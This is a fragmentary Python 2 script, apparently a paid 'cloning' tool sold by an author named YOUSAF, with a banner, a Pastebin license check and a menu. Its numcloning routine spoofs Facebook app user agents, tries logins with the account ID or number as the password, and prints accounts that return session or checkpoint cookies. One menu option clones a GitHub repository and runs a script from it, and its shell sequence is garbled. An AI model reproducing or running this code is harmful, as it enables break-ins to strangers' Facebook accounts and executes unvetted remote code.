...
logo = """'
\x1b[1;92m'  __   _____  _   _ ____    _    _____ 
'\x1b[1;92m' \ \ / / _ \| | | / ___|  / \  |  ___|
'\x1b[1;91m'  \ V / | | | | | \___ \ / _ \ | |_   
'\x1b[1;97m'   | || |_| | |_| |___) / ___ \|  _|  
'\x1b[1;93m'   |_| \___/ \___/|____/_/   \_\_|    


'\x1b[1;91m'   Author      :     YOUSAF    
'\x1b[1;92m'   Github      :     YOUSAF-G
'\x1b[1;93m'   FB ID        :     YOUSAF KHAN
'\x1b[1;94m'   TOOL TYPE   :     PAID COMMANDS
'\x1b[1;96m'   WAP NUMBER  :    03181483064           
"""
dec="2"
server="2"


rsauser = 'Mozilla/5.0 (Linux; Charsi 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
...
def main_apv():
    ...
    print logo
    try:
        key1=open("/sdcard/.Charsi.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
    ...
    r1=requests.get("https://pastebin.com/raw/Hxq5w8iF").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("\x1b[1;92m        Member In Yousaf Paid Commands ")
        print ("\x1b[1;91m        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/YOUSAF-G/YOUSAF-XD")
        os.system("rm -rf YOUSAF-XD")
        os.system("cp -f YOUSAF-XD/YOUSAF-XD \\.")
        os.system("rm -rf YOUSAF-XD")
        os.system(" cd YOUSAF-XD")
        os.system(" python2 YOUSAF.py")
        time.sleep(5)
...
def numcloning():
    ...
    def main(arg):
        user = arg
        lines = random.choice([
			"Dalvik/1.6.0 (Linux; U; Charsi 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Charsi 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]", 
			"Mozilla/5.0 (Linux; Charsi 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Charsi 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        try:
            pass1 = user
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[YOUSAF-CP] "+coc+user + " | " + pass1
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;91m[YOUSAF-CP] "+uid + " | " + pass1
